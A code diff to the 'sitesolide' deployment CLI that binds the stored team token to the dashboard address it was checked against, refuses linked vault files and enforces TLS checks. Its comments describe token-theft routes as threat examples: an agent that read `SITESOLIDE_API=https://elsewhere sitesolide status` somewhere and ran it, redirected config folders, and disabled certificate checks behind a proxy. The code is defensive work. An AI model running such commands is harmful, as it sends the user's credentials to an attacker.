@@ -18,7 +18,9 @@
  * vault, `~/.config/sitesolide/secrets/team-token`, 0600, beside the other
  * credentials the workstation presents; `SITESOLIDE_TOKEN` in the environment
  * wins over it, for a sandbox that has no files to keep. The dashboard's
- * address is in config.json, under `api`, or in `SITESOLIDE_API`.
+ * address is in config.json, under `api`, or in `SITESOLIDE_API`; the one the
+ * vault's token was checked against is beside it, `team-token-api`, and the
+ * vault's token goes nowhere else (boundAddress).
  *
  * **The token only ever goes to that address.** The archive is sent to
  * `<api>/api/v1/deployments/<id>/bundle`, built here, and never to an address
@@ -36,7 +38,7 @@
  * prints the same events and one final `result` or `error`, and a dry run is
  * refused, saying why, until the control API can judge without deploying.
  */
-import { chmodSync, existsSync, lstatSync, mkdirSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
+import { chmodSync, closeSync, constants, existsSync, fstatSync, lstatSync, mkdirSync, openSync, readdirSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
 import { homedir } from "node:os";
 import { dirname, join, resolve } from "node:path";
 import { bundle, excludedBy, type BundleEntry } from "./bundle";
@@ -49,6 +51,12 @@ import { sourceRefusal } from "./source";
 
 /** Where the token is kept in the vault. */
 export const TOKEN_FILE = "team-token";
+
+/**
+ * Beside it, the dashboard `login` checked it against, the only address it
+ * goes to: see boundAddress.
+ */
+export const TOKEN_ADDRESS_FILE = "team-token-api";
 
 /** The limits the dashboard applies, checked here first so that a refusal comes before the upload. */
 export const LIMITS = { bundleBytes: 100 * 1024 * 1024, extractedBytes: 512 * 1024 * 1024, entries: 20_000 };
@@ -120,12 +128,82 @@ export function readRemote(environment: Environment, home = homedir()): Remote |
   }
   let token = environment.SITESOLIDE_TOKEN ?? "";
   if (token === "") {
-    const path = tokenPath(environment, home);
-    if (!existsSync(path)) return { missing: `no token in ${path}: run sitesolide login, or set SITESOLIDE_TOKEN` };
-    token = readFileSync(path, "utf8").trim();
+    const vault = vaultFolder(environment, home);
+    const path = join(vault, TOKEN_FILE);
+    const kept = readVaultFile(path);
+    if (kept.kind === "absent") return { missing: `no token in ${path}: run sitesolide login, or set SITESOLIDE_TOKEN` };
+    if (kept.kind === "refused") return { missing: `${path} is a link or has another name: run sitesolide login, which writes the token there itself` };
+    // The vault's token goes to the dashboard `login` checked it against,
+    // and to no other: `SITESOLIDE_API=https://elsewhere sitesolide status`,
+    // typed by an agent that read it somewhere, sent the bearer there, out of
+    // a vault the agent itself may not read. A sandbox aims elsewhere with a
+    // token of its own, SITESOLIDE_TOKEN beside it.
+    const bound = boundAddress(vault);
+    if (bound !== api) {
+      const named = environment.SITESOLIDE_API !== undefined ? "SITESOLIDE_API" : "config.json";
+      return { missing: `${named} names ${api}, not ${bound ?? "the address login wrote"}, the dashboard the token in the vault was checked against: run sitesolide login --url ${api}, or set SITESOLIDE_TOKEN beside it` };
+    }
+    token = kept.text.trim();
   }
   if (!/^sst_[A-Za-z0-9_-]{43}$/.test(token)) return { missing: "the token does not have the shape sst_...: ask the owner of the machine for a new one" };
   return { api, token };
+}
+
+/**
+ * The one address the vault's token may go to, or null when none can be
+ * trusted. Never the configuration the environment chooses: config.json is
+ * no secret, an agent that may not read the vault may still write it or run
+ * `sitesolide init --api`, and the environment picks which config.json is
+ * read at all. `SITESOLIDE_CONFIG_DIR=/tmp/x`, or another `HOME`, with a
+ * config.json there naming an attacker's `api` and the real vault, by its
+ * `vault` key or SITESOLIDE_VAULT, made that `api` the one the real token
+ * was compared with, and sent it there.
+ *
+ * The address `login` wrote in the vault beside the token, first: the vault
+ * is the one folder the agent can neither read nor write.
+ *
+ * A vault `login` filled before it wrote the address holds none. Its token
+ * goes where it always did, the `api` of the config.json `login` wrote then,
+ * beside the vault's real folder, `secrets/`, whatever the environment
+ * names: a vault elsewhere, with no configuration beside it, holds nothing
+ * that says where its token was checked, and the answer is `sitesolide
+ * login` again, which writes the address.
+ */
+function boundAddress(vault: string): string | null {
+  const recorded = readVaultFile(join(vault, TOKEN_ADDRESS_FILE));
+  if (recorded.kind === "present") return apiOrigin(recorded.text);
+  if (recorded.kind === "refused") return null;
+  try {
+    const parsed = JSON.parse(readFileSync(join(dirname(realpathSync(vault)), "config.json"), "utf8")) as { api?: unknown } | null;
+    return typeof parsed?.api === "string" ? apiOrigin(parsed.api) : null;
+  } catch {
+    return null;
+  }
+}
+
+type VaultRead = { kind: "absent" } | { kind: "refused" } | { kind: "present"; text: string };
+
+/**
+ * A file the vault's token depends on, read only when it is a plain file with
+ * a single name, judged on the descriptor that reads it. A vault folder the
+ * environment names is anyone's to fill: a link there, or a second name
+ * given to the real token, put that token in a vault whose address someone
+ * else wrote.
+ */
+function readVaultFile(path: string): VaultRead {
+  let fd: number;
+  try {
+    fd = openSync(path, constants.O_RDONLY | constants.O_NOFOLLOW | constants.O_NONBLOCK);
+  } catch (error) {
+    return (error as NodeJS.ErrnoException).code === "ENOENT" ? { kind: "absent" } : { kind: "refused" };
+  }
+  try {
+    const info = fstatSync(fd);
+    if (!info.isFile() || info.nlink !== 1 || info.size > 64 * 1024) return { kind: "refused" };
+    return { kind: "present", text: readFileSync(fd, "utf8") };
+  } finally {
+    closeSync(fd);
+  }
 }
 
 // --- talking to the API ------------------------------------------------------------
@@ -133,7 +211,7 @@ export function readRemote(environment: Environment, home = homedir()): Remote |
 export type Failure = { error: string; message: string; details?: string[]; wait?: number };
 export type Answer<T> = { ok: true; status: number; body: T } | { ok: false; status: number; failure: Failure };
 
-export type Fetch = (input: string, init?: RequestInit) => Promise<Response>;
+export type Fetch = (input: string, init?: BunFetchRequestInit) => Promise<Response>;
 
 /** One call: the bearer, JSON back, every failure said in the API's own words. */
 export async function call<T>(remote: Remote, path: string, init: RequestInit = {}, fetcher: Fetch = fetch): Promise<Answer<T>> {
@@ -143,6 +221,10 @@ export async function call<T>(remote: Remote, path: string, init: RequestInit = 
       ...init,
       redirect: "error",
       headers: { Authorization: `Bearer ${remote.token}`, ...(init.headers ?? {}) },
+      // The certificate is checked whatever the environment says: Bun's
+      // fetch obeys NODE_TLS_REJECT_UNAUTHORIZED=0, and HTTPS_PROXY beside it
+      // let the proxy answer the handshake itself and read the bearer.
+      tls: { rejectUnauthorized: true },
     });
   } catch (error) {
     return { ok: false, status: 0, failure: { error: "unreachable", message: `${remote.api} unreachable: ${(error as Error).message}` } };
@@ -423,6 +505,15 @@ export async function login(arguments_: string[], dependencies: Omit<RemoteDepen
 
   let token = environment.SITESOLIDE_TOKEN ?? "";
   if (arguments_.includes("--token-stdin")) token = (await (dependencies.stdin ?? (() => Bun.stdin.text()))()).trim();
+  if (token === "" && interactive && (dependencies.terminal ?? (() => process.stdin.isTTY === true))()) {
+    // At a terminal, without echo, as `secrets set` reads a value: the
+    // token typed at `prompt` stayed on the screen and in the scrollback,
+    // a credential that deploys and sets secrets, shown to whoever looks.
+    const typed = await (dependencies.secretPrompt ?? promptWithoutEcho)("Token, sst_..., as the owner of the machine gave it (no echo): ");
+    if (typed === null) return report(output, { error: "cancelled", message: "nothing typed: nothing was written" });
+    if (typeof typed !== "string") return report(output, { error: "invalid", message: `${typed.refused}: nothing was written` });
+    token = typed.trim();
+  }
   if (token === "") token = ask("Token, sst_..., as the owner of the machine gave it:").trim();
   if (!/^sst_[A-Za-z0-9_-]{43}$/.test(token)) return report(output, { error: "invalid", message: "this is not a sitesolide token: it starts with sst_ and is 47 characters long" });
 
@@ -435,6 +526,11 @@ export async function login(arguments_: string[], dependencies: Omit<RemoteDepen
   const path = join(vault, TOKEN_FILE);
   writeFileSync(path, `${token}\n`, { mode: 0o600 });
   chmodSync(path, 0o600);
+  // The address the token was just checked against, beside it in the vault,
+  // and the only one readRemote sends it to: see boundAddress.
+  const address = join(vault, TOKEN_ADDRESS_FILE);
+  writeFileSync(address, `${api}\n`, { mode: 0o600 });
+  chmodSync(address, 0o600);
   const file = rawConfig(home, environment);
   mkdirSync(dirname(configPath(home, environment)), { recursive: true });
   writeFileSync(configPath(home, environment), `${JSON.stringify({ ...file, api }, null, 2)}\n`);
@@ -1441,7 +1537,7 @@ export const REMOTE_USAGE = [
   "",
   "--json, on every one of them: one JSON event per line, see docs/agents.md",
   "a secret's value never goes on the command line: with --json, secrets set needs --stdin",
-  "SITESOLIDE_API and SITESOLIDE_TOKEN in the environment win over the files.",
+  "SITESOLIDE_API and SITESOLIDE_TOKEN, both in the environment, win over the files.",
 ];
 
 /** Runs a command through the API; the exit code is returned, never thrown. */
